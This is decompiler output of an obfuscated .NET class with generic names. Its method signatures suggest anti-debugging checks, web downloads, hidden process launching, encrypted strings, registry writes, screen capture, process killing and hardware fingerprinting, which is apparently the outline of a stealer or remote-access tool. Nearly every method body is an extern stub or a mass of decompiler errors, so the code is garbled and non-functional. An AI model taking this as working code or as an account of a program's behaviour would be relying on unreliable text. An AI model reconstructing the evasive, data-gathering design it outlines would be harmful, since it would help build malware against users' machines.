using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Management;
using System.Net;
using System.Net.NetworkInformation;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using Microsoft.Win32;

namespace ns0;

internal class Class5
{
	public static bool bool_0;

	public static bool bool_1;

	public static bool bool_2;

	public static bool bool_3;

	public static bool bool_4;

	public static string string_0;

	public static string string_1;

	private static readonly List<string> list_0;

	public static string string_2;

	public static string string_3;

	private static FileSystemWatcher fileSystemWatcher_0;

	[DllImport("kernel32.dll")]
	public static extern IntPtr GetModuleHandle(string string_4);

	[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
	private static extern bool CheckRemoteDebuggerPresent(IntPtr intptr_0, ref bool bool_5);

	private static extern string smethod_0();

	public static extern string smethod_1(string string_4);

	private static extern void Main();

	private static extern void smethod_2();

	private static extern bool smethod_3();

	private static bool smethod_4()
	{
		/*Error: Unknown opcode: 0xFC*/;
	}

	private static extern bool smethod_5();

	private static extern string smethod_6();

	private unsafe static void smethod_7()
	{
		*(_003F*)(nint)/*Error near IL_0001: Stack underflow*/ = /*Error near IL_0001: Stack underflow*/;
		*(_003F*)(nint)/*Error near IL_0003: Stack underflow*/ = /*Error near IL_0003: Stack underflow*/;
		/*Error near IL_0003: Invalid metadata token*/;
	}

	private static extern void smethod_8(object sender, FileSystemEventArgs e);

	private static extern void smethod_9();

	private static extern void smethod_10();

	public static extern bool smethod_11(string string_4);

	public extern Class5();

	static extern string smethod_12(string string_4);

	static extern WebClient smethod_13();

	static extern string smethod_14(string string_4, string string_5);

	static extern void smethod_15(WebClient webClient_0, string string_4, string string_5);

	static extern void smethod_16(Component component_0);

	static extern Process smethod_17();

	static extern ProcessStartInfo smethod_18();

	static void smethod_19(ProcessStartInfo processStartInfo_0, ProcessWindowStyle processWindowStyle_0)
	{
		//Discarded unreachable code: IL_0005, IL_0011, IL_0016
		//IL_000c: Incompatible stack heights: 0 vs 1
		//IL_0016: Unknown result type (might be due to invalid IL or missing references)
		//IL_0018: Expected O, but got Unknown
		/*Error: Invalid metadata token*/;
	}

	static extern void smethod_20(ProcessStartInfo processStartInfo_0, string string_4);

	static string smethod_21(string string_4, string string_5, string string_6)
	{
		//Discarded unreachable code: IL_0005, IL_0016, IL_0025, IL_002a, IL_0031, IL_0038
		//IL_0011: Invalid comparison between I and F8
		//IL_0020: Invalid comparison between Unknown and I8
		//IL_002a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0034: Expected O, but got I4
		//IL_003b: Expected I, but got F4
		while (true)
		{
		}
	}

	static extern void smethod_22(ProcessStartInfo processStartInfo_0, string string_4);

	unsafe static void smethod_23(Process process_0, ProcessStartInfo processStartInfo_0)
	{
		//Discarded unreachable code: IL_0009, IL_0012
		//IL_0005: Expected O, but got I4
		//IL_000c: Expected I, but got F4
		ushort num = *(ushort*)(nint)/*Error near IL_0002: Stack underflow*/;
		checked
		{
			_ = (byte)((float[])/*Error near IL_0003: Stack underflow*/)[num];
			/*Error near IL_0004: Invalid metadata token*/;
		}
	}

	static extern bool smethod_24(Process process_0);

	static extern void smethod_25(int int_0);

	static extern void smethod_26(string string_4);

	static string smethod_27(string string_4)
	{
		//Discarded unreachable code: IL_0026, IL_0032
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Expected I4, but got Unknown
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_0014: Invalid comparison between Unknown and I8
		//IL_0020: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Unknown result type (might be due to invalid IL or missing references)
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		while (true)
		{
			_003F val = checked(1.1861971E-20f + /*Error near IL_0005: ldarg 3 (out-of-bounds)*/);
			((int[])/*Error near IL_0008: Stack underflow*/)[/*Error near IL_0008: Stack underflow*/] = (int)val;
			((short[])/*Error near IL_0009: Stack underflow*/)[/*Error near IL_0009: Stack underflow*/] = (short)/*Error near IL_0009: Stack underflow*/;
			if (/*Error near IL_0011: Stack underflow*/ == /*Error near IL_0011: Stack underflow*/)
			{
				ulong num;
				checked
				{
					_003F val2 = /*Error near IL_0012: Stack underflow*/+ /*Error near IL_0012: Stack underflow*/;
					num = (ulong)unchecked(/*Error near IL_0013: Stack underflow*/ - val2);
				}
				if ((long)/*Error near IL_0019: Stack underflow*/ > (long)num && /*Error near IL_0019: Stack underflow*/> /*Error near IL_001a: ldarg 3 (out-of-bounds)*/)
				{
					break;
				}
			}
		}
		_ = /*Error near IL_0021: Stack underflow*/* /*Error near IL_0021: Stack underflow*/;
		/*Error near IL_0021: Invalid metadata token*/;
	}

	static extern byte[] smethod_28(string string_4);

	static extern RijndaelManaged smethod_29();

	static extern void smethod_30(SymmetricAlgorithm symmetricAlgorithm_0, int int_0);

	static void smethod_31(SymmetricAlgorithm symmetricAlgorithm_0, int int_0)
	{
		_003F val = /*Error: ldarg 3 (out-of-bounds)*/;
		uint num = ((uint[])/*Error near IL_0002: Stack underflow*/)[val];
		_ = (float)(nint)((IntPtr[])/*Error near IL_0003: Stack underflow*/)[num];
		/*Error near IL_0005: ldloc 0 (out-of-bounds)*/;
		/*Error: Unexpected end of block*/;
	}

	static extern Encoding smethod_32();

	static byte[] smethod_33(Encoding encoding_0, string string_4)
	{
		return (byte[])/*Error near IL_0001: Stack underflow*/;
	}

	static extern void smethod_34(SymmetricAlgorithm symmetricAlgorithm_0, byte[] byte_0);

	unsafe static void smethod_35(SymmetricAlgorithm symmetricAlgorithm_0, byte[] byte_0)
	{
		//Discarded unreachable code: IL_0018
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		int num = *(int*)null;
		_ = *(uint*)(nint)(/*Error near IL_000d: Stack underflow*/ / num);
		/*Error near IL_0013: Invalid metadata token*/;
	}

	unsafe static void smethod_36(SymmetricAlgorithm symmetricAlgorithm_0, PaddingMode paddingMode_0)
	{
		//IL_0015: Expected I4, but got F4
		while (true)
		{
			((sbyte[])/*Error near IL_0001: Stack underflow*/)[/*Error near IL_0001: Stack underflow*/] = (sbyte)/*Error near IL_0001: Stack underflow*/;
			if ((int)/*Error near IL_0006: Stack underflow*/ == 0)
			{
				*(short*)(nint)/*Error near IL_0008: Stack underflow*/ = (short)paddingMode_0;
				if (/*Error near IL_000d: Stack underflow*/ < /*Error near IL_000d: Stack underflow*/)
				{
					break;
				}
			}
		}
		int num = checked((int)/*Error near IL_000e: Stack underflow*/);
		switch ((int)((float[])/*Error near IL_0010: Stack underflow*/)[num])
		{
		default:
			;
			break;
		}
		/*Error: Unexpected end of block*/;
	}

	static extern void smethod_37(SymmetricAlgorithm symmetricAlgorithm_0, CipherMode cipherMode_0);

	static extern byte[] smethod_38(SymmetricAlgorithm symmetricAlgorithm_0);

	unsafe static byte[] smethod_39(SymmetricAlgorithm symmetricAlgorithm_0)
	{
		//IL_0002: Expected F8, but got I4
		*(double*)(nint)/*Error near IL_0002: Stack underflow*/ = 1.0;
		_ = ((sbyte[])/*Error near IL_0004: Stack underflow*/)[/*Error near IL_0004: Stack underflow*/];
		/*Error: Unexpected end of block*/;
	}

	static ICryptoTransform smethod_40(SymmetricAlgorithm symmetricAlgorithm_0, byte[] byte_0, byte[] byte_1)
	{
		//Discarded unreachable code: IL_0005, IL_000a, IL_0010, IL_0015, IL_0018, IL_001e, IL_0024, IL_002b
		//IL_000a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0018: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Invalid comparison between Unknown and I4
		/*Error: Invalid metadata token*/;
	}

	static extern byte[] smethod_41(ICryptoTransform icryptoTransform_0, byte[] byte_0, int int_0, int int_1);

	static Encoding smethod_42()
	{
		return (Encoding)/*OpCode not supported: Nop*/;
	}

	unsafe static string smethod_43(Encoding encoding_0, byte[] byte_0)
	{
		//Discarded unreachable code: IL_0002
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		_ = *(byte*)(nint)/*Error near IL_0001: Stack underflow*/;
		/*Error near IL_0001: Unknown opcode: 0xFF*/;
	}

	static extern void smethod_44(IDisposable idisposable_0);

	static extern Assembly smethod_45();

	static extern string smethod_46(Assembly assembly_0);

	static extern void smethod_47(string string_4, string string_5, bool bool_5);

	static extern RegistryKey smethod_48(RegistryKey registryKey_0, string string_4, bool bool_5);

	static void smethod_49(RegistryKey registryKey_0, string string_4, object object_0)
	{
		//Discarded unreachable code: IL_0006
		/*Error near IL_0001: Invalid metadata token*/;
	}

	static extern void smethod_50(string string_4, FileAttributes fileAttributes_0);

	static extern RegistryKey smethod_51(RegistryKey registryKey_0, string string_4);

	static extern void smethod_52(RegistryKey registryKey_0);

	static extern Rectangle smethod_53(Point point_0);

	static extern Bitmap smethod_54(int int_0, int int_1);

	static extern Graphics smethod_55(Image image_0);

	unsafe static void smethod_56(Graphics graphics_0, Point point_0, Point point_1, Size size_0)
	{
		*(_003F*)(nint)/*Error near IL_0001: Stack underflow*/ = /*Error near IL_0001: Stack underflow*/;
		_ = 7;
		/*Error: Unexpected end of block*/;
	}

	unsafe static ImageFormat smethod_57()
	{
		//Discarded unreachable code: IL_001e, IL_002a, IL_002d, IL_0033
		//IL_0003: Invalid comparison between Unknown and I4
		//IL_0009: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected I, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected I8, but got F8
		//IL_0025: Incompatible stack heights: 0 vs 1
		//IL_002b: Invalid comparison between Unknown and F8
		//IL_002b: Incompatible stack heights: 1 vs 0
		//IL_002e: Expected I4, but got Unknown
		//IL_0034: Unknown result type (might be due to invalid IL or missing references)
		byte num;
		do
		{
			num = *(byte*)(nint)/*Error near IL_0003: Stack underflow*/;
		}
		while ((int)/*Error near IL_0008: Stack underflow*/ == num);
		float num2 = (float)/*Error near IL_0009: Stack underflow*/;
		_003F val = /*Error near IL_000a: Stack underflow*/* num2;
		*(IntPtr*)(nint)/*Error near IL_000b: Stack underflow*/ = (IntPtr)val;
		*(_003F*)(nint)/*Error near IL_000c: Stack underflow*/ = /*Error near IL_000c: Stack underflow*/;
		_ = *(short*)(nint)(/*Error near IL_000d: Stack underflow*/ >> (int)/*Error near IL_000d: Stack underflow*/);
		_ = 8L;
		/*Error near IL_0019: Invalid metadata token*/;
	}

	static extern void smethod_58(Image image_0, string string_4, ImageFormat imageFormat_0);

	static extern bool smethod_59(string string_4);

	static extern void smethod_60(Process process_0);

	static extern string[] smethod_61(string string_4, char[] char_0);

	static extern string smethod_62(WebClient webClient_0, string string_4);

	static extern string smethod_63();

	static extern string smethod_64();

	unsafe static string smethod_65(string[] string_4)
	{
		//Discarded unreachable code: IL_000e, IL_0014, IL_001f, IL_0028
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0018: Unknown result type (might be due to invalid IL or missing references)
		//IL_001a: Invalid comparison between Unknown and I4
		_003F val;
		do
		{
			float num = *(float*)(nint)/*Error near IL_0001: Stack underflow*/;
			val = /*Error near IL_0002: Stack underflow*/| num;
		}
		while (/*Error near IL_0007: Stack underflow*/ >= val);
		_ = *(uint*)(int)(*(byte*)(nint)/*Error near IL_0008: Stack underflow*/);
		/*Error near IL_0009: Invalid metadata token*/;
	}

	static extern void smethod_66(string string_4, string string_5);

	static extern Process[] smethod_67();

	static extern string smethod_68(Process process_0);

	static extern void smethod_69(Process process_0);

	static extern Process smethod_70();

	static extern IntPtr smethod_71(Process process_0);

	static extern ManagementObjectSearcher smethod_72(string string_4);

	static extern ManagementObjectCollection smethod_73(ManagementObjectSearcher managementObjectSearcher_0);

	static extern ManagementObjectEnumerator smethod_74(ManagementObjectCollection managementObjectCollection_0);

	static ManagementBaseObject smethod_75(ManagementObjectEnumerator managementObjectEnumerator_0)
	{
		return (ManagementBaseObject)/*Error near IL_0002: Stack underflow*/;
	}

	static extern object smethod_76(ManagementBaseObject managementBaseObject_0, string string_4);

	static extern string smethod_77(object object_0);

	static extern string smethod_78(string string_4);

	static extern bool smethod_79(string string_4, string string_5);

	static extern string smethod_80(string string_4);

	static extern bool smethod_81(string string_4, string string_5);

	static extern bool smethod_82(ManagementObjectEnumerator managementObjectEnumerator_0);

	static extern NetworkInterface[] smethod_83();

	static extern OperationalStatus smethod_84(NetworkInterface networkInterface_0);

	static PhysicalAddress smethod_85(NetworkInterface networkInterface_0)
	{
		//Discarded unreachable code: IL_0005, IL_000a, IL_001f, IL_0022
		//IL_0009: Expected O, but got I4
		//IL_0019: Unknown result type (might be due to invalid IL or missing references)
		while (true)
		{
		}
	}

	static extern string smethod_86(string string_4, char[] char_0);

	static extern FileSystemWatcher smethod_87();

	static extern string smethod_88(Environment.SpecialFolder specialFolder_0);

	static extern void smethod_89(FileSystemWatcher fileSystemWatcher_1, string string_4);

	static extern void smethod_90(FileSystemWatcher fileSystemWatcher_1, NotifyFilters notifyFilters_0);

	static void smethod_91(FileSystemWatcher fileSystemWatcher_1, string string_4)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		_003F val;
		do
		{
			val = /*Error near IL_0001: Stack underflow*/* /*Error near IL_0001: Stack underflow*/;
		}
		while (/*Error near IL_0006: Stack underflow*/ >= val);
		/*Error near IL_0008: ldloc 2 (out-of-bounds)*/;
		/*Error near IL_0009: Invalid metadata token*/;
	}

	static extern void smethod_92(FileSystemWatcher fileSystemWatcher_1, FileSystemEventHandler fileSystemEventHandler_0);

	static extern void smethod_93(FileSystemWatcher fileSystemWatcher_1, bool bool_5);

	static bool smethod_94(string string_4, string string_5)
	{
		/*Error near IL_0001: Stack underflow*/;
		/*Error: Unexpected end of block*/;
	}

	static extern bool smethod_95(string string_4);

	static extern string[] smethod_96(string string_4, string string_5);

	static extern Match smethod_97(string string_4, string string_5);

	static extern WebHeaderCollection smethod_98(WebClient webClient_0);

	static extern void smethod_99(WebHeaderCollection webHeaderCollection_0, HttpRequestHeader httpRequestHeader_0, string string_4);
}
